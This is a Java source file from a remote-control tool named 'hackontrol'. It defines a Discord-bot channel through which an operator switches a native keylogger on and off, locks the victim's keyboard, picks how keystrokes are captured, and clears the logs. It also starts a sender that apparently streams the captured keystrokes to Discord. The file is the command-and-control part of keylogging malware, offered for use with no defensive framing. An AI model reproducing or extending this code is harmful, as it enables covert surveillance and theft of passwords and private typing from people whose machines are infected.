package com.khopan.hackontrol.channel.keylogger;

import java.util.List;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.manager.button.ButtonContext;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.manager.button.Question;
import com.khopan.hackontrol.manager.button.Question.OptionType;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageHistory;
import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;

public class KeyLoggerChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "keylogger";

	static boolean RawKeyMode;

	private static final Button BUTTON_ENABLE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Enable", "enableKeyLogger");
	private static final Button BUTTON_DISABLE = ButtonManager.staticButton(ButtonStyle.DANGER, "Disable", "disableKeyLogger");

	private static final Button BUTTON_LOCK_KEYBOARD = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Lock Keyboard", "lockKeyboard");
	private static final Button BUTTON_UNLOCK_KEYBOARD = ButtonManager.staticButton(ButtonStyle.DANGER, "Unlock Keyboard", "unlockKeyboard");

	private static final Button BUTTON_RAW_KEY_MODE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Raw Key Mode", "rawKeyMode");
	private static final Button BUTTON_TEXT_MODE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Text Mode", "textMode");

	private static final Button BUTTON_CLEAR = ButtonManager.staticButton(ButtonStyle.DANGER, "Clear", "keyloggerClear");

	@Override
	public String getName() {
		return KeyLoggerChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(KeyLoggerChannel.BUTTON_ENABLE, KeyLoggerChannel.BUTTON_DISABLE), ActionRow.of(KeyLoggerChannel.BUTTON_LOCK_KEYBOARD, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD), ActionRow.of(KeyLoggerChannel.BUTTON_RAW_KEY_MODE, KeyLoggerChannel.BUTTON_TEXT_MODE, KeyLoggerChannel.BUTTON_CLEAR)).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_ENABLE, context -> this.buttonEnable(context, true));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_DISABLE, context -> this.buttonEnable(context, false));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_LOCK_KEYBOARD, context -> this.buttonLock(context, true));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD, context -> this.buttonLock(context, false));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_RAW_KEY_MODE, context -> this.buttonRawKeyMode(context, true));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_TEXT_MODE, context -> this.buttonRawKeyMode(context, false));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_CLEAR, this :: buttonClear);
		KeyLogSender.start(this.channel);
	}

	private void buttonEnable(ButtonContext context, boolean enable) {
		if(NativeLibrary.Enable == enable) {
			HackontrolMessage.boldDeletable(context.reply(), "KeyLogger is already " + (enable ? "enabled" : "disabled"));
			return;
		}

		if(enable) {
			NativeLibrary.Enable = enable;
			context.acknowledge();
			return;
		}

		Question.positive(context.reply(), "Are you sure you want to disable KeyLogger?", OptionType.YES_NO, () -> NativeLibrary.Enable = false);
	}

	private void buttonLock(ButtonContext context, boolean lock) {
		if(NativeLibrary.Block == lock) {
			HackontrolMessage.boldDeletable(context.reply(), "Keyboard is already " + (lock ? "locked" : "unlocked"));
			return;
		}

		if(lock) {
			NativeLibrary.Block = lock;
			context.acknowledge();
			return;
		}

		Question.positive(context.reply(), "Are you sure you want to unlock the keyboard?", OptionType.YES_NO, () -> NativeLibrary.Block = false);
	}

	private void buttonRawKeyMode(ButtonContext context, boolean rawKeyMode) {
		if(KeyLoggerChannel.RawKeyMode == rawKeyMode) {
			HackontrolMessage.boldDeletable(context.reply(), (rawKeyMode ? "Raw key" : "Text") + " mode is already enabled");
			return;
		}

		KeyLoggerChannel.RawKeyMode = rawKeyMode;
		context.acknowledge();
	}

	private void buttonClear(ButtonContext context) {
		long identifier = context.getEvent().getMessageIdLong();
		MessageChannel channel = context.getChannel();
		Question.positive(context.reply(), "Are you sure you want to clear the KeyLog information?", OptionType.YES_NO, () -> {
			MessageHistory.getHistoryFromBeginning(channel).queue(history -> {
				List<Message> list = history.getRetrievedHistory();

				for(int i = 0; i < list.size(); i++) {
					Message message = list.get(i);

					if(message.getIdLong() != identifier) {
						message.delete().queue();
					}
				}
			});
		});
	}
}
